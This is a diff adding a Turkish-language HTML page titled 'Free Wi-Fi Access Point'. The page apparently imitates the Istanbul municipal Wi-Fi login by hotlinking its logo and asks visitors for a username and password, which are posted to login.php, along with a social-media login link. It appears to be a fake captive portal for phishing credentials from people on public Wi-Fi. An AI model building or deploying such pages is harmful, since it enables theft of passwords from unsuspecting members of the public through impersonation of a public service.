@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="icon" type="image/png" href="gokhan/favicon.jpg"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ücretsiz Wi-Fi Erişim Noktası</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="wifi-container">
+    <!-- Logo eklemek için div -->
+    <div class="logo-container">
+      <img src="https://wifi.ibb.istanbul/static/media/Group%206120.4106c4076162143bc2fd.png" alt="Wi-Fi Logo" class="wifi-logo">
+    </div>
+    
+    <h2>Ücretsiz Wi-Fi</h2>
+    <p>Lütfen giriş yapın:</p>
+    <form action="login.php" method="post">
+      <label for="username">Kullanıcı Adı:</label>
+      <input type="text" id="username" name="username" required>
+      <label for="password">Şifre:</label>
+      <input type="password" id="password" name="password" required>
+      <button type="submit">Giriş Yap</button>
+    </form>
+
+    <!-- Tıklanabilir bağlantı eklemek için aşağıdaki örneği kullanabilirsiniz -->
+    <p>sosyal medya ile giriş yap <a href="kayit.php">oturum aç</a></p>
+
+    <div class="social-icons">
+      <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram Logo"></a>
+      <a href="#"><img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo"></a>
+      <a href="#"><img src="https://store-images.s-microsoft.com/image/apps.60673.9007199266244427.4d45042b-d7a5-4a83-be66-97779553b24d.5d82b7eb-9734-4b51-b65d-a0383348ab1b" alt="Twitter Logo"></a>
+    </div>
+  </div>
+</body>
+</html>
